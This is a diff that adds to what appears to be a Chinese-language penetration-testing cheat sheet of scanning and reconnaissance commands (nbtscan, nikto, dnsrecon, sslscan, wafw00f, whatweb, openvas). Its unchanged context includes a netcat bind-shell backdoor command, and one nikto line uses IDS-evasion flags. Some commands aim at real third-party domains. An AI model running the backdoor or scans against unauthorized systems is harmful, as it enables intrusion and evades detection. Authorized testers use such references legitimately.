@@ -1,9 +1,25 @@
+hacknet hackthegame uplink hackerevolution
+sn1per cain abel maltego owasp zap
+
 通过 nc 创建后门
 ncat -l 10000 -e /bin/bash
 ncat 192.168.1.100 10000
 通过 nc 进行端口转发
 ncat -u -l  80 -c  'ncat -u -l 8080'
 
+windows机器扫描
+brew install nbtscan
+nbtstat 192.168.1.99
+nbtscan 192.168.1.25-137
+nbtscan 192.168.1.0/24
+nbtscan -r 192.168.1.0/24
+nbtscan 192.168.1.4 10.4.2.3 www.yahoo.com
+nbtscan -f iplist
+git clone https://github.com/scallywag/nbtscan
+cd nbtscan/
+./configure
+make
+make install
 
 nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16
 -sn    不扫描端口，只ping主机
@@ -93,7 +109,30 @@ $ ./fierce.pl -dns example.com
 $ ./fierce.pl –dns example.com –wordlist myWordList.txt
 
 使用 Nikto 扫描 Web 服务
+nikto -update
+nikto -list-plugin
+nikto -host <IP&URL>
+nikto -host <IP&URL> -port 80,22,25,445
+nikto -host <IP&URL> -port -ssl
+nikto -host <IP&URL> -port -ssl -useproxy http://127.0.0.1:9999 #代理
+nikto -host <IP&URL> -port -ssl -useproxy <服务器IP:port> -evasion 167 #防止被IDS检测异常请求 随机URL(非UTF-8)编码 TAB替换空格 改变URL大小写
+namp -p80 10.10.10.0/24 -oG - | nikto -host - #配合nmap使用，扫描同一网段，多个主机
+nikto -host 10.10.10.129 -F htm -o htm
 nikto -C all -h http://IP
+git clone https://github.com/sullo/nikto.git
+docker build -t sullo/nikto .
+docker run --rm sullo/nikto
+docker run --rm sullo/nikto -h http://www.example.com
+docker run --rm -v $(pwd):/tmp sullo/nikto -h http://www.example.com -o /tmp/out.json
+
+截图保存
+CutyCapt --url=http://www.example.org --out=example.png
+
+dnsrecon DNS信息收集
+https://github.com/darkoperator/dnsrecon
+./dnsrecon.py qq.com
+./dnsrecon.py -d baidu.com -t std -v --lifetime 20
+./dnsrecon.py -r 110.129.8.1-110.129.8.30 -t rvl -v --lifetime 30
 
 扫描 WordPress
 git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
@@ -532,6 +571,42 @@ sqlmap
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 python sqlmap.py -h
 
+sslscan SSL版本检测
+sslscan --tlsall www.baidu.com:443
+sslscan --tlsall 192.168.5.200
+
+sslyze SSL扫描工具
+pip install --upgrade setuptools
+pip install --upgrade sslyze
+sslyze --regular www.example.com
+python -m sslyze --regular www.yahoo.com:443 www.google.com "[2607:f8b0:400a:807::2004]:443"
+
+wafw00f 识别网站WAF的工具
+https://github.com/EnableSecurity/wafw00f
+python setup.py install
+wafw00f http://www.victim.org/
+wafw00f -l
+
+whatweb 开源网站指纹识别软件
+对单个目标进行简单探测whatweb+目标
+sudo gem install json
+sudo gem install mongo
+whatweb 192.168.159.167
+whatweb --input-file=/root/test/123.txt
+whatweb -i '/root/test/123.txt'
+whatweb 192.168.159.1 --log-xml=result.xml
+
+https://github.com/1N3/BruteX
+./install.sh
+brutex target <port>
+docker build -t brutex .
+docker run -it brutex target <port>
+
+https://github.com/1N3/Findsploit
+https://github.com/1N3/Goohak
+https://github.com/1N3/BlackWidow
+https://github.com/aboul3la/Sublist3r
+https://github.com/scipag/vulscan
 
 渗透测试插件化并发框架
 git clone https://github.com/Xyntax/POC-T
@@ -932,3 +1007,18 @@ https://github.com/shmilylty/OneForAll
 https://github.com/blechschmidt/massdns
 
 https://github.com/angryip/ipscan
+
+openvas一个免费的漏洞扫描工具
+git clone https://github.com/greenbone/openvas
+cd openvas
+cmake .
+make install
+https://github.com/greenbone/openvas/releases
+openvasmd --list-users
+openvasmd --user=admin --new-password=
+openvasmd  --create-user=root  --password=root --role=Admin
+openvas-feed-update
+openvasmd -h
+openvas-start
+https://127.0.0.1:9392
+
